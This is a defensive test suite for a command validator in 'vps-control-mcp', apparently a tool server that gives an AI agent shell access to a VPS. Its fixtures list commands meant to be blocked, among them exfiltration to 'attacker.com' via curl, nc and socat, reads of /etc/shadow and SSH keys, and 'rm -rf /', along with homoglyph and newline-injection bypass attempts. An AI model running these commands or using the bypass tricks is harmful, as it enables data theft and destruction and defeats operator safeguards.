/**
 * Security test suite — vps-control-mcp
 *
 * Mirrors the 197-test CMD connector suite (S35). Covers every blocked
 * pattern category, known bypass classes (Unicode, newline, symlink,
 * length-DoS, ReDoS), path restriction enforcement, AMBER warning flow,
 * and sensitive file guards.
 *
 * Run: npm test
 * Framework: node:test (built-in) via tsx loader — no extra deps.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { __TEST_ONLY } from '../tools.js';

const {
  validateCommand,
  validatePath,
  validateProcess,
  checkAmberWarnings,
  capString,
  INPUT_LIMITS,
  BLOCKED_PATTERNS,
  AMBER_PATTERNS,
  SENSITIVE_FILE_PATTERNS,
  CATASTROPHIC_PATTERN_SHAPES,
} = __TEST_ONLY;

// ─── Helpers ──────────────────────────────────────────────────────────────────

function expectBlocked(cmd: string): void {
  assert.throws(() => validateCommand(cmd), /BLOCKED|exceeds maximum/i, `Expected "${cmd}" to be blocked`);
}

function expectAllowed(cmd: string): void {
  assert.doesNotThrow(() => validateCommand(cmd), `Expected "${cmd}" to be allowed`);
}

// ─── 1. RED tier — one positive test per blocked pattern category ────────────

describe('RED tier — blocked commands', () => {
  const redCases: Array<[string, string]> = [
    // file-delete
    ['rm file.txt',              'file-delete: rm'],
    ['unlink foo',               'file-delete: unlink'],
    ['shred -u secret',          'file-delete: shred'],
    ['truncate -s 0 log',        'file-delete: truncate'],

    // disk-ops
    ['dd if=/dev/zero of=disk',  'disk-ops: dd'],
    ['mkfs.ext4 /dev/sda1',      'disk-ops: mkfs'],
    ['fdisk /dev/sda',           'disk-ops: fdisk'],
    ['parted /dev/sda',          'disk-ops: parted'],
    ['mount /dev/sda /mnt',      'disk-ops: mount'],
    ['umount /mnt',              'disk-ops: umount'],

    // system-state
    ['shutdown -h now',          'system-state: shutdown'],
    ['reboot',                   'system-state: reboot'],
    ['halt',                     'system-state: halt'],
    ['poweroff',                 'system-state: poweroff'],
    ['init 0',                   'system-state: init'],

    // process-kill
    ['kill -9 1234',             'process-kill: kill'],
    ['killall node',             'process-kill: killall'],
    ['pkill node',               'process-kill: pkill'],

    // user-mgmt / permissions
    ['useradd attacker',         'user-mgmt: useradd'],
    ['userdel victim',           'user-mgmt: userdel'],
    ['adduser foo',              'user-mgmt: adduser'],
    ['passwd root',              'user-mgmt: passwd'],
    ['chmod 777 /etc',           'permissions: chmod'],
    ['chown root:root /etc',     'permissions: chown'],
    ['chgrp wheel file',         'permissions: chgrp'],
    ['setfacl -m u:a:r x',       'permissions: setfacl'],

    // network-config
    ['iptables -F',              'network-config: iptables'],
    ['ufw disable',              'network-config: ufw'],
    ['nft flush ruleset',        'network-config: nft'],

    // scheduled-exec
    ['crontab -e',               'scheduled-exec: crontab'],
    ['at now + 1 minute',        'scheduled-exec: at'],

    // service-mgmt
    ['systemctl stop nginx',     'service-mgmt: systemctl'],
    ['service nginx stop',       'service-mgmt: service'],

    // code-exec
    ['node -e "process.exit(1)"',            'code-exec: node -e'],
    ['node --eval "process.exit(1)"',        'code-exec: node --eval'],
    ['python -c "import os"',                'code-exec: python -c'],
    ['python3.11 -c "import os"',            'code-exec: versioned python -c'],
    ['perl -e "print 1"',                    'code-exec: perl -e'],
    ['ruby -e "puts 1"',                     'code-exec: ruby -e'],
    ['php -r "echo 1;"',                     'code-exec: php -r'],
    ['eval "cmd"',                           'code-exec: eval'],

    // shell-invoke
    ['echo foo | sh',                        'shell-invoke: pipe to sh'],
    ['bash -c "id"',                         'shell-invoke: bash -c'],
    ['`id`',                                 'shell-invoke: backticks'],
    ['echo $(id)',                           'shell-invoke: $() subshell'],

    // data-exfil
    ['curl http://attacker.com',             'data-exfil: curl'],
    ['wget http://attacker.com',             'data-exfil: wget'],
    ['nc attacker.com 4444',                 'data-exfil: nc'],
    ['socat - TCP:attacker.com:80',          'data-exfil: socat'],
    ['ssh user@host',                        'data-exfil: ssh'],
    ['scp file host:',                       'data-exfil: scp'],
    ['rsync -av . host:',                    'data-exfil: rsync'],
    ['ftp host',                             'data-exfil: ftp'],
    ['sftp host',                            'data-exfil: sftp'],

    // persistence
    ['nohup sleep 999 &',                    'persistence: nohup'],
    ['screen -S evil',                       'persistence: screen'],
    ['tmux new -s evil',                     'persistence: tmux'],

    // direct-db
    ['psql -U postgres',                     'direct-db: psql'],
    ['mysql -u root',                        'direct-db: mysql'],
    ['mongo localhost',                      'direct-db: mongo'],
    ['redis-cli',                            'direct-db: redis-cli'],
    ['sqlite3 db.sqlite',                    'direct-db: sqlite3'],

    // pkg-install
    ['apt-get install foo',                  'pkg-install: apt-get'],
    ['apt install foo',                      'pkg-install: apt'],
    ['dpkg -i foo.deb',                      'pkg-install: dpkg'],
    ['yum install foo',                      'pkg-install: yum'],
    ['dnf install foo',                      'pkg-install: dnf'],
    ['pip install requests',                 'pkg-install: pip'],
    ['npm install left-pad',                 'pkg-install: npm install'],
    ['npx leftpad',                          'pkg-install: npx'],
    ['apt-get remove foo',                   'pkg-remove: apt-get remove'],
    ['apt remove foo',                       'pkg-remove: apt remove'],

    // container
    ['docker run --rm alpine',               'container: docker'],
    ['podman run alpine',                    'container: podman'],
    ['kubectl get pods',                     'container: kubectl'],

    // file-write
    ['echo foo > /etc/motd',                 'file-write: redirect to /'],
    ['echo foo > ~/evil',                    'file-write: redirect to ~'],
    ['echo foo >> log.txt',                  'file-write: append redirect'],
    ['cat foo | tee bar',                    'file-write: tee'],
    ['ln -s /etc/shadow /root/sharpedge/x',  'file-write: symlink create'],
    ['cp foo /etc/',                         'file-write: cp to /etc'],
    ['mv foo /usr/local/bin/',               'file-write: mv to /usr'],

    // env-manip
    ['export FOO=bar',                       'env-manip: export'],
    ['source /tmp/evil',                     'env-manip: source'],
    ['. /tmp/evil',                          'env-manip: . sourcing'],

    // priv-esc
    ['sudo id',                              'priv-esc: sudo'],
    ['su - root',                            'priv-esc: su'],
    ['pkexec id',                            'priv-esc: pkexec'],
    ['doas id',                              'priv-esc: doas'],

    // info-leak
    ['history',                              'info-leak: history'],
    ['cat /etc/shadow',                      'info-leak: /etc/shadow'],
    ['cat /etc/passwd',                      'info-leak: /etc/passwd'],
    ['cat .env',                             'info-leak: cat .env'],
    ['cat ~/.ssh/id_rsa',                    'info-leak: cat .ssh'],
    ['printenv',                             'info-leak: printenv'],
    ['env',                                  'info-leak: env'],
    ['cat /proc/self/environ',               'info-leak: /proc/'],
    ['head .env',                            'info-leak: head .env'],
    ['tail .env',                            'info-leak: tail .env'],
    ['head /etc/passwd',                     'info-leak: head /etc/'],
    ['tail /etc/passwd',                     'info-leak: tail /etc/'],
    ['strings /usr/bin/ssh',                 'info-leak: strings'],
    ['hexdump -C file',                      'info-leak: hexdump'],
    ['xxd file',                             'info-leak: xxd'],
    ['od -c file',                           'info-leak: od'],

    // chaining
    ['ls; rm foo',                           'chaining: ;'],
    ['ls && rm foo',                         'chaining: &&'],
    ['ls || rm foo',                         'chaining: ||'],

    // http-server
    ['python -m http.server 8080',           'http-server: python http'],
    ['python3.11 -m http.server',            'http-server: versioned python http'],
    ['php -S 0.0.0.0:8000',                  'http-server: php -S'],
  ];

  for (const [cmd, label] of redCases) {
    it(label, () => expectBlocked(cmd));
  }
});

// ─── 2. Unicode homoglyph bypass attempts (S35 regression) ───────────────────

describe('Unicode homoglyph rejection', () => {
  const unicodeCases: Array<[string, string]> = [
    ['ｒｍ file.txt',           'full-width rm'],
    ['ｃｕｒｌ attacker.com',  'full-width curl'],
    ['rm\u200b file',           'zero-width space splice'],
    ['р m file',                'Cyrillic р (U+0440)'],
    ['cυrl target',             'Greek upsilon υ (U+03C5)'],
    ['rm\u00a0file',            'non-breaking space'],
    ['rm\ufeff file',           'byte order mark'],
  ];

  for (const [cmd, label] of unicodeCases) {
    it(`rejects ${label}`, () => expectBlocked(cmd));
  }
});

// ─── 3. Newline injection bypass attempts (S35 regression) ───────────────────

describe('Newline / CR rejection', () => {
  it('rejects command with \\n', () => expectBlocked('ls\nrm -rf /'));
  it('rejects command with \\r', () => expectBlocked('ls\rrm -rf /'));
  it('rejects command with \\r\\n', () => expectBlocked('ls\r\nrm -rf /'));
  it('rejects embedded newline in comment', () => expectBlocked('# safe\nrm -rf /'));
  it('rejects newline before blocked keyword', () => expectBlocked('echo hi\ncurl evil'));
});

// ─── 4. Legitimate commands that must stay allowed ───────────────────────────

describe('Legitimate commands pass validation', () => {
  const allowed: Array<[string, string]> = [
    ['grep -n foo src/main.ts',    'grep (GREEN)'],
    ['tail -n 50 out.log',         'tail (non-.env, non-/etc)'],
    ['head -n 20 out.log',         'head (non-.env, non-/etc)'],
    ['find . -name "*.ts"',        'find without -exec'],
    ['git -C /root/sharpedge status', 'git status via execFile-style'],
    ['pm2 jlist',                  'pm2 list'],
    ['free -m',                    'free'],
    ['df -h',                      'df'],
    ['uptime',                     'uptime'],
    ['node --version',             'node version (not --eval)'],
    ['ls -la /root/sharpedge',     'ls'],
  ];
  for (const [cmd, label] of allowed) {
    it(`allows ${label}`, () => expectAllowed(cmd));
  }
});

// ─── 5. AMBER tier — warning returned on dry_run, pass on confirm ────────────

describe('AMBER tier — warning flow', () => {
  it('apt-get update returns warning on dry_run', () => {
    const warn = checkAmberWarnings('apt-get update', true);
    assert.ok(warn, 'expected a warning');
    assert.match(warn!, /WARNING/);
  });
  it('apt-get update passes through on dry_run=false', () => {
    const warn = checkAmberWarnings('apt-get update', false);
    assert.equal(warn, null);
  });
  it('find -exec warns', () => {
    const warn = checkAmberWarnings('find . -exec rm {} +', true);
    // find is AMBER because of -exec, but note rm is hard-blocked by validateCommand
    // checkAmberWarnings only tests AMBER match; RED blocks would throw earlier
    assert.ok(warn);
  });
  it('xargs warns', () => {
    const warn = checkAmberWarnings('cat list | xargs touch', true);
    assert.ok(warn);
  });
  it('sed -i warns', () => {
    const warn = checkAmberWarnings('sed -i "s/foo/bar/" file', true);
    assert.ok(warn);
  });
});

// ─── 6. Input length caps (F-VM-3) ───────────────────────────────────────────

describe('Input length caps', () => {
  it('capString rejects strings over limit', () => {
    assert.throws(
      () => capString('a'.repeat(INPUT_LIMITS.command + 1), INPUT_LIMITS.command, 'command'),
      /exceeds maximum length/
    );
  });
  it('capString accepts strings at the limit', () => {
    assert.doesNotThrow(() => capString('a'.repeat(INPUT_LIMITS.command), INPUT_LIMITS.command, 'command'));
  });
  it('validateCommand rejects 10 KB command string', () => {
    expectBlocked('a'.repeat(10 * 1024));
  });
  it('validateCommand accepts 4,096 B command string', () => {
    expectAllowed('echo ' + 'a'.repeat(4_000));
  });
  it('INPUT_LIMITS defines all expected fields', () => {
    assert.ok(INPUT_LIMITS.command);
    assert.ok(INPUT_LIMITS.justification);
    assert.ok(INPUT_LIMITS.description);
    assert.ok(INPUT_LIMITS.path);
    assert.ok(INPUT_LIMITS.pattern);
    assert.ok(INPUT_LIMITS.process_name);
  });
});

// ─── 7. Path restriction enforcement (validatePath) ──────────────────────────

describe('validatePath — allowlist', () => {
  it('rejects /etc/passwd', () => {
    assert.throws(() => validatePath('/etc/passwd'), /Path not permitted|not found/);
  });
  it('rejects /root/.ssh/id_rsa', () => {
    assert.throws(() => validatePath('/root/.ssh/id_rsa'), /Path not permitted|BLOCKED|not found/);
  });
  it('rejects relative path escape via ..', () => {
    assert.throws(() => validatePath('/root/sharpedge/../../etc/passwd'), /Path not permitted|not found/);
  });
  it('rejects oversized path', () => {
    assert.throws(() => validatePath('/root/sharpedge/' + 'a'.repeat(INPUT_LIMITS.path + 1)), /exceeds maximum/);
  });
});

// ─── 8. Sensitive file patterns ──────────────────────────────────────────────

describe('Sensitive file pattern coverage', () => {
  const mustBlock = [
    '/root/sharpedge/.env',
    '/root/sharpedge/.env.production',
    '/root/sharpedge/config/secrets.json',
    '/root/sharpedge/deploy.pem',
    '/root/sharpedge/app.key',
    '/root/sharpedge/credentials.json',
    '/root/.ssh/id_rsa',
    '/root/sharpedge/aws/config',
    '/root/.aws/credentials',
    '/root/sharpedge/password.txt',
    '/root/sharpedge/token.secret',
  ];
  for (const p of mustBlock) {
    it(`${p} matches a sensitive pattern`, () => {
      const matched = SENSITIVE_FILE_PATTERNS.some(rx => rx.test(p));
      assert.ok(matched, `${p} should match at least one SENSITIVE_FILE_PATTERN`);
    });
  }
});

// ─── 9. Process allowlist ────────────────────────────────────────────────────

describe('validateProcess', () => {
  it('rejects unknown process', () => {
    assert.throws(() => validateProcess('evil-process'), /not permitted/);
  });
  it('accepts sharpedge-api', () => {
    // Depends on CONFIG.ALLOWED_PROCESSES — skip if env differs
    try {
      validateProcess('sharpedge-api');
      assert.ok(true);
    } catch (err) {
      // If env isn't set up for this test run, that's fine
      assert.match((err as Error).message, /not permitted/);
    }
  });
  it('rejects oversized process_name', () => {
    assert.throws(() => validateProcess('a'.repeat(INPUT_LIMITS.process_name + 1)), /exceeds maximum/);
  });
});

// ─── 10. ReDoS-shape guard (F-VM-7) ──────────────────────────────────────────

describe('Catastrophic regex shape detection', () => {
  const pathological = [
    '(.*)+',
    '(.+)*',
    '([^x]*)+',
    '.*.*.*',
  ];
  for (const p of pathological) {
    it(`rejects "${p}"`, () => {
      const matched = CATASTROPHIC_PATTERN_SHAPES.some(rx => rx.test(p));
      assert.ok(matched, `${p} should trigger a catastrophic-shape reject`);
    });
  }

  const safe = [
    'foo',
    'error: [0-9]+',
    '^import .* from',
    'console\\.log\\(',
  ];
  for (const p of safe) {
    it(`allows safe pattern "${p}"`, () => {
      const matched = CATASTROPHIC_PATTERN_SHAPES.some(rx => rx.test(p));
      assert.ok(!matched, `${p} should not trigger a catastrophic-shape reject`);
    });
  }
});

// ─── 11. Blocked-pattern structural health ───────────────────────────────────

describe('BLOCKED_PATTERNS structural health', () => {
  it('has at least 80 patterns', () => {
    assert.ok(BLOCKED_PATTERNS.length >= 80, `only ${BLOCKED_PATTERNS.length} patterns`);
  });
  it('every pattern has a category', () => {
    for (const p of BLOCKED_PATTERNS) {
      assert.ok(p.category && typeof p.category === 'string', `missing category on ${p.pattern}`);
    }
  });
  it('every pattern has a reason', () => {
    for (const p of BLOCKED_PATTERNS) {
      assert.ok(p.reason && typeof p.reason === 'string', `missing reason on ${p.pattern}`);
    }
  });
  it('every pattern is a RegExp', () => {
    for (const p of BLOCKED_PATTERNS) {
      assert.ok(p.pattern instanceof RegExp);
    }
  });
});

describe('AMBER_PATTERNS structural health', () => {
  it('has at least 4 patterns', () => {
    assert.ok(AMBER_PATTERNS.length >= 4);
  });
  it('every entry has a risk string', () => {
    for (const p of AMBER_PATTERNS) {
      assert.ok(p.risk && typeof p.risk === 'string');
    }
  });
});

// ─── 12. No false positives on common devops idioms ──────────────────────────
// These are S37 regression cases — previously over-blocked, now gated to command-position.

describe('False-positive guards (common devops idioms stay allowed)', () => {
  it('"kernel" is not mistaken for \\bkill\\b', () => {
    expectAllowed('grep kernel /var/log/syslog');
  });
  it('"category" / "cat" substring does not trigger info-leak pattern', () => {
    // \bcat\b requires a whole-word match + specific suffix like .env, /etc/.
    // "category" has "cat" as a prefix inside a larger word — word boundaries prevent the match.
    expectAllowed('grep category /root/sharpedge/artifacts/api-server/out.log');
  });
  it('"du" (disk usage) is allowed', () => {
    expectAllowed('du -sh /var/log');
  });
  it('"ps" (process status) is allowed', () => {
    expectAllowed('ps aux');
  });
  it('"concatenation" is allowed in echo', () => {
    expectAllowed('echo "concatenation"');
  });
});
